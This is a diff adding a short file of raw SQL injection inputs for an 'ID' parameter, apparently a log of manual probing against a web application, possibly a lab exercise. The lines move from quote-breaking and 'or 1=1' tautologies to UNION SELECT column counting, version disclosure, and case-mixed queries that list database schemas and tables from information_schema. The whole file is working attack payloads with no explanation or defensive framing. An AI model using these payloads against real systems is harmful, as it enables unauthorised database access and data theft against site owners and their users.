@@ -1,0 +1,28 @@
+ID:'
+ID:1') -- -
+ID:1') union select version() --
+ID:'
+ID:1' UNION SELECT @,@,@-- 
+ID:')
+ID:1'') --
+ID:1'') union select 1,2,3--
+ID:1'') union select 1,2,3,4--
+ID:1'') or 1=1 --
+ID:1') or 1=1 --
+ID:1') --
+ID:1 ') --
+ID:1 ') -- -
+ID:1 ') union select 1,2,3,4 -- -
+ID:1 ') union select 1,2,3 -- -
+ID:1 ') union select 1,2,'a' -- -
+ID:1 ') union select 1,2,5 -- -
+ID:1 ') union select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata -- -
+ID:1 ') --
+ID:1
+ID:2
+ID:10
+ID:100
+ID:100') union select 1,2,3 -- -
+ID:100') union select 1,2,version -- -
+ID:100') union select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata -- -
+ID:100') union select 1,2,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema= -- -
